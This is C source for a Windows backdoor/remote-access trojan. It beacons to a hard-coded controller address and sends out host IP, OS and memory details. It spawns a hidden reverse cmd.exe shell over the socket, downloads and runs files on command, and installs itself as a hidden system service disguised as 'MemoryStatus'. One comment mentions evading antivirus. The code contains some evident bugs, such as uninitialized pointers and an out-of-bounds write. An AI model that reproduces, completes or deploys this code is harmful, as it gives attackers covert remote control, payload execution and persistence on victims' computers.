#include <stdio.h>
#include<WinSock2.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>

// GCC lwininet ws2_32
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
#define S_OK                                   ((HRESULT)0L)
#define S_FALSE                                ((HRESULT)1L)
#define false                                  FALSE
#define true                                   TRUE
#define bool                                   BOOL
#define ERROR_SUCCESS                           0L
#define SERVER_HEARTS                           0
#define SERVER_SHELL                            2
#define SERVER_DOWNLOAD                         4
#define SERVER_OPENURL                          8
#define SERVER_SYSTEMINFO                       10
// int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
char const FLAG_[15] = "yyyyyyyyyyyyyyy";
char const address[] = "127.0.0.1";
char const port[] = "81";
char const sign[10] = "customize";
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
struct CMSG{
        char sign[10];
        UINT8 mod;//自定义模式
        UINT8 msg_l;
};
struct CFILE{
    char address[255];
    char save_path[255];
    int execute;
};

//-----------------------------TOOLKIT FUNCTION START------------------------------------------------

BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet, hUrl;
	HANDLE		hFile;
	char		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	BOOL		bRet = true;
	
	hInternet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
		return false;
	
	hUrl = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hUrl == NULL)
		return false;
	
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	
	return bRet;
}

DWORD WINAPI DownManager(LPVOID lparam,LPCTSTR save_path,bool execute)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	if (save_path!=NULL){
        lpFileName = save_path;
    }else{
        lpFileName = strrchr(lpURL, '/') + 1;
    }
	
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	if (execute){
        STARTUPINFO si = {0};
	    PROCESS_INFORMATION pi;
	    si.cb = sizeof si;
	    si.lpDesktop = "WinSta0\\Default"; 
	    CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }

	return true;
}

//OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL); 显示打开网页
//OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);   隐藏打开网页
BOOL OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return FALSE;

	// System 权限下不能直接利用shellexecute来执行
	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return FALSE;
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (lstrlen(strIEPath) == 0)
		return FALSE;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return FALSE;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 

	CreateProcess(NULL, strIEPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return 0;
}


//-----------------------------TOOLKIT FUNCTION END--------------------------------------------------

//-------------------------SYSTEM INFOMATION START---------------------------------------------------


char* getIpAddress(){
    WSADATA wsaData;
    char name[255];//定义用于存放获得的主机名的变量 
    char *ip;//定义IP地址变量 
    PHOSTENT hostinfo;
    if ( WSAStartup( MAKEWORD(2,0), &wsaData ) == 0 ) {
        if( gethostname ( name, sizeof(name)) == 0) {
            if((hostinfo = gethostbyname(name)) != NULL) {
                ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
            }
        }
    }
    return ip;
}
char* getOsInfo()
{
	// get os name according to version number
	OSVERSIONINFO osver = { sizeof(OSVERSIONINFO) };
	GetVersionEx(&osver);
	char *os_name;
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)
		os_name = "Windows 2000";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)
		os_name = "Windows XP";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0)
		os_name = "Windows 2003";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)
		os_name = "windows vista";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1)
		os_name = "windows 7";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2)
		os_name = "windows 10";
    return os_name;
}
char* getMemoryInfo()
{
    #define  GBYTES  1073741824  
    #define  MBYTES  1048576  
    #define  KBYTES  1024  
    #define  DKBYTES 1024.0 
    #define kMaxInfoBuffer 256

	char* memory_info;
    char  buffer[kMaxInfoBuffer];

	MEMORYSTATUSEX statusex;
	statusex.dwLength = sizeof(statusex);
	if (GlobalMemoryStatusEx(&statusex))
	{
		unsigned long long total = 0, remain_total = 0, avl = 0, remain_avl = 0;
		double decimal_total = 0, decimal_avl = 0;
		remain_total = statusex.ullTotalPhys % GBYTES;
		total = statusex.ullTotalPhys / GBYTES;
		avl = statusex.ullAvailPhys / GBYTES;
		remain_avl = statusex.ullAvailPhys % GBYTES;
		if (remain_total > 0)
			decimal_total = (remain_total / MBYTES) / DKBYTES;
		if (remain_avl > 0)
			decimal_avl = (remain_avl / MBYTES) / DKBYTES;
 
		decimal_total += (double)total;
		decimal_avl += (double)avl;
		
		sprintf(buffer, "Total %.2f GB (%.2f GB available)", decimal_total, decimal_avl);
		memory_info = buffer;
        // printf(memory_info);
        return memory_info;
	}
	
}
char* getSystemInfomation(char* systeminfo){
    static char data[1024];
    char *os;
    char *ip;
    char * memory;
    os = getOsInfo();
    ip = getIpAddress();
    memory = getMemoryInfo();
    sprintf(data,"%s\n%s\n%s\n",ip,os,memory);
    if (data[1024] != '\0'){
       data[1024]='\0'; 
    }
    strcpy(systeminfo,data);
    
}
//-------------------------SYSTEM INFOMATION END-----------------------------------------------------


void BackDoor(SOCKET sock){
    
    
    int ret;
    char Buff[1024]; 
    SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
    pipeattr1.nLength=12; 
    pipeattr1.lpSecurityDescriptor=0; 
    pipeattr1.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0); 
    pipeattr2.nLength=12; 
    pipeattr2.lpSecurityDescriptor=0; 
    pipeattr2.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0); 
    STARTUPINFO si; 
    ZeroMemory(&si,sizeof(si)); 
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    si.wShowWindow=SW_HIDE; 
    si.hStdInput=hReadPipe2; 
    si.hStdOutput=si.hStdError=hWritePipe1; 
    char cmdline[]="cmd.exe"; 
    PROCESS_INFORMATION ProcessInformation; 
    ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 

    unsigned long lBytesRead; 
    while (1) 
    { 
        printf("looping...\n");
        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0, 0  ); 
        if (lBytesRead) 
        { 
            
            ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
            if (!ret) break; 
            ret=send(sock,Buff+'\0',lBytesRead,0);
            printf("Send:\n%sSendEnd\n",Buff);
            if (ret<=0) break; 
        } else { 
            lBytesRead=recv(sock,Buff,1024,0);
            printf("Recv:\n%s\nRecvEnd\n",Buff);
            

            if (lBytesRead<=0 || Buff == "reset") {
                break;
            }//没数据or服务器退出(mod:1) 
            ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
            if (!ret) break; 
            if (ret<=0)break;
            // Sleep(600);
        }
    }
    return;
}

void Handle(){
    WSADATA WSAData;
    SOCKET sock; 

    SOCKADDR_IN addr_in;
    

    
    WSAStartup(MAKEWORD(2,2),&WSAData); 

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(atoi(port)); 
    addr_in.sin_addr.S_un.S_addr=inet_addr(address);
 
    sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    
    if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
        return;
    }
    char  systeminfo[1024] ;
    getSystemInfomation(systeminfo);
    struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_SYSTEMINFO,
                .msg_l = strlen(systeminfo)
                //.msg_l = 0
             };
    send(sock,(char*)&msg,sizeof(struct CMSG),0);
    send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
    while (TRUE){
        char * address = malloc(sizeof(struct CMSG));
        int ret = recv(sock,address,sizeof(struct CMSG),0);
        struct CMSG msg = *(struct CMSG*)address;
        printf("Sign:%s\nMOD:%d\nLONG:%d\n",msg.sign,msg.mod,msg.msg_l);
        free(address);
        if(ret == -1){
            break;
        }
        if (strcmp(msg.sign,sign) != 0){
            printf("echo debug dafa hao");
            continue;
        }
        switch (msg.mod){
            case SERVER_HEARTS:
                {struct CMSG msg = {
                .sign =  "customize",
                .mod = SERVER_HEARTS,
                .msg_l = 0
             };}
                ret = send(sock,(char*)&msg,sizeof(struct CMSG),0);//心跳包
                continue;
            case SERVER_SHELL:
                // CMD命令  
                BackDoor(sock);
                continue;
            case SERVER_DOWNLOAD:
                {
                    struct CFILE* f_obj;
                    ret = recv(sock,(char *)f_obj,msg.msg_l,0);
                    if (ret <= 0){
                        continue;
                    }
                    if(f_obj->address && f_obj->save_path == "NULL"){
                        DownManager(f_obj->address,NULL,f_obj->execute);
                        
                    }else{
                        DownManager(f_obj->address,f_obj->save_path,f_obj->execute);
                    }
                    
                }
                continue;
            case SERVER_OPENURL:
                {
                    continue;
                }
            
            

        }
        
        

    }
}
void Init(){

    CreateEventA(0,FALSE,FALSE,"MemoryStatus");
    while(1){
        Handle();
        //这里可以把Sleep替换成其他检测方式已绕过杀软检测
    }
}

void WINAPI ServiceMain(DWORD dwArgc,  LPTSTR* lpszArgv){
    DWORD dwThreadId;
    // WriteToLog("Running..");
    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler("MemoryStatus",
                     BDHandler))) return;
    ServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState  = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP
                      | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode        = 0;
    ServiceStatus.dwCheckPoint            = 0;
    ServiceStatus.dwWaitHint              = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    Init();
}


void WINAPI BDHandler(DWORD dwControl)
{
 switch(dwControl)
 {
    case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    default:
        break;
 }
}
void ServiceSvchostInstall(BOOL exits){

}
void ServiceInstall(BOOL run){
    char  szPath[MAX_PATH];
    char  target[MAX_PATH] = "c:\\";
    char  tar_path[MAX_PATH];
    char  Direectory[MAX_PATH];
    char  cmd[255];
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (OpenEventA(2031619,FALSE,"MemoryStatus") != 0 ){
        return ;
    }
    // AdvanceProcess();
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (char*)"MemoryStatus";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable); 
    // if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return 1;
    
    if( !GetModuleFileName( NULL, (LPSTR)szPath, MAX_PATH ) ) return ;
    if(!GetCurrentDirectory(MAX_PATH,Direectory)) return ;
    // printf("Direectory:%s\nszPath:%s\ntarget:%s\n",Direectory,szPath,target);
    if (strcmp(Direectory,target) != 0 ){
        //判断是否在windows目录下
        strcat(target,"\\csrse.exe");
        // printf(target);
        CopyFile(szPath,target,TRUE);
        sprintf(cmd,"sc create MemoryStatus binPath= %s",target);
        // ShellExecuteA(NULL,"open","sc.exe",cmd,"",SW_HIDE);
        // ShellExecuteA(NULL,"open","sc.exe","start MemoryStatus","",SW_HIDE);
        system(cmd);
        sprintf(cmd,"attrib +s +a +h +r %s",target);
        system(cmd);
        system("sc start MemoryStatus");
        if (run){
            system(target);
            exit(0);
        }
        
        return ;
     }
    // printf("\nRun");
}
void WriteRegedits(){
    
}
int _stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
    
    Handle();
    return 0;
}
